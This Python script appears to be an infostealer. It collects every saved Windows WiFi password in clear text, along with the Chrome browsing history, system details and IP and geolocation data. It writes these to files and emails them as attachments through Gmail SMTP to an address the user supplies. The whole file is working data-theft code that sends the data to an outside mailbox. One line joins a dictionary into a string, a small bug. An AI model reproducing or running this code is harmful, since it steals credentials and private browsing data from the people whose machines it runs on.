
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import socket
import os
import sqlite3
from datetime import datetime
import platform
import psutil
import subprocess
import re
import shutil
import requests


def get_ip_addresses():
    try:
        # Fetch public IP address
        public_ip = requests.get('https://api.ipify.org').text
    except Exception as e:
        public_ip = "Error fetching public IP: " + str(e)

    try:
        # Get local IP address
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except Exception as e:
        local_ip = "Error fetching local IP: " + str(e)

    return public_ip, local_ip

# Usage
public_ip, local_ip = get_ip_addresses()
print("Public IP Address:", public_ip)
print("Local IP Address:", local_ip)

def get_ip_info(ip_address):
    url = f"https://ipinfo.io/{ip_address}/json"
    response = requests.get(url)
    data = response.json()
    return data

ip_address = public_ip  # Example IP address, you can replace it with any IP address you want to lookup
ip_info = get_ip_info(ip_address)

def get_wifi_passwords():
    try:
        result = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [line.split(":")[1][1:-1] for line in result if "All User Profile" in line]
        passwords = dict()

        for profile in profiles:
            try:
                password_result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8').split('\n')
                password = [line.split(":")[1][1:-1] for line in password_result if "Key Content" in line][0]
                passwords[profile] = password
            except subprocess.CalledProcessError as e:
                passwords[profile] = "Password not found"
        
        return passwords

    except Exception as e:
        return f"Error: {e}"


def save_to_file(data, filename):
    try:
        with open(filename, 'w') as f:
            for profile, password in data.items():
                f.write(f"WiFi Network: {profile}, Password: {password}\n")
        return f"Data saved to {filename} successfully."
    except Exception as e:
        return f"Error saving data to file: {e}"

# Example usage
wifi_passwords = get_wifi_passwords()
save_result = save_to_file(wifi_passwords, r'wifi_pass.txt')
print(save_result)

def get_chrome_history(output_file=r'history_chrome.txt'):
    # Chrome history database path
    history_db_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
    
    # Copying the history database file to avoid potential conflicts while Chrome is running
    try:
        tmp_history_db_path = r"History_tmp"
        shutil.copy2(history_db_path, tmp_history_db_path)
    except Exception as e:
        return f"Error copying history database: {e}"
    
    try:
        # Connect to the copied history database
        conn = sqlite3.connect(tmp_history_db_path)
        cursor = conn.cursor()
        
        # Query to select history data
        query = "SELECT title, url, last_visit_time FROM urls ORDER BY last_visit_time DESC"
        cursor.execute(query)
        
        # Fetch all rows
        rows = cursor.fetchall()
        
        # Write history data to output file
        with open(output_file, "w", encoding="utf-8") as f:
            for row in rows:
                f.write(f"Title: {row[0]}\nURL: {row[1]}\nLast Visit Time: {row[2]}\n\n")
        
        return f"Chrome history successfully exported to {output_file}"
    
    except Exception as e:
        return f"Error accessing Chrome history: {e}"
    
    finally:
        # Close database connection and remove temporary file
        conn.close()
        os.remove(tmp_history_db_path)

# Example usage
result = get_chrome_history()
print(result)

def get_system():
    system_platform = platform.platform()

    # Get system architecture (32-bit or 64-bit)
    system_architecture = platform.architecture()

    # Get CPU information
    cpu_info = platform.processor()

    # Get total and available memory
    memory_info = psutil.virtual_memory()
    total_memory = memory_info.total
    available_memory = memory_info.available

    # Get disk usage information
    disk_usage = psutil.disk_usage('/')
    total_disk_space = disk_usage.total
    used_disk_space = disk_usage.used
    free_disk_space = disk_usage.free

    # Get network information
    network_info = psutil.net_if_addrs()

    # Get battery information (if available)
    battery_info = psutil.sensors_battery()
    if battery_info is not None:
        battery_percentage = battery_info.percent
        power_plugged = battery_info.power_plugged

    # Write system information to a text file
    output_files = [r"system_information.txt"]
    for file_name in output_files:
        with open(file_name, "w", encoding="utf-8") as file:
                file.write("System Information:\n")
                file.write(f"System Platform: {system_platform}\n")
                file.write(f"System Architecture: {system_architecture}\n")
                file.write(f"CPU: {cpu_info}\n")
                file.write(f"Total Memory: {total_memory}\n")
                file.write(f"Available Memory: {available_memory}\n")
                file.write(f"Total Disk Space: {total_disk_space}\n")
                file.write(f"Used Disk Space: {used_disk_space}\n")
                file.write(f"Free Disk Space: {free_disk_space}\n")

                file.write("Network Interfaces:\n")
                for interface, addresses in network_info.items():
                    file.write(f"Interface: {interface}\n")
                    for address in addresses:
                        file.write(f"- Address: {address.address}, Netmask: {address.netmask}, Broadcast: {address.broadcast}\n")

                if battery_info is not None:
                    file.write("Battery Information:\n")
                    file.write(f"Battery Percentage: {battery_percentage}\n")
                    file.write(f"Power Plugged In: {power_plugged}\n")

        print(f"System information saved to {', '.join(output_files)}")

get_system()       
    
sender_email = '' #type sender email here
reciever_email = '' #type reseiver email here
sender_password = '' #make an app password in your  google account


def send_files_with_body(filepaths, body, sender_email, receiver_email, password):
    # Email configuration

    # Create a multipart message
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Files Attachment"

    # Attach body to email
    message.attach(MIMEText(body, "plain"))

    # Attach files to the email
    for filepath in filepaths:
        with open(filepath, "rb") as f:
            attachment = MIMEApplication(f.read(), _subtype="txt")
            attachment.add_header('Content-Disposition', 'attachment', filename=filepath.split("/")[-1])
            message.attach(attachment)

    # Establish a connection with the SMTP server
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()  # Secure the connection
        # Login to your email account
        server.login(sender_email, password)
        # Send the email
        server.sendmail(sender_email, receiver_email, message.as_string())

# Example usage
file_paths = [r"wifi_pass.txt", r"history_chrome.txt", r"system_information.txt"]

email_body = (
    "- IP Addresses [public = " + public_ip + ", local = " + local_ip + "]\n"
    "This email contains attachments:\n"
    "- WiFi Passwords: wifi_pass.txt\n"
    "- Chrome History: chrome_history.txt\n"
    "- System Information: system_information.txt\n"
    "- ip info : " + ip_info + "\n"
)
send_files_with_body(file_paths, email_body, sender_email, reciever_email, sender_password)
print("email sent successfully")

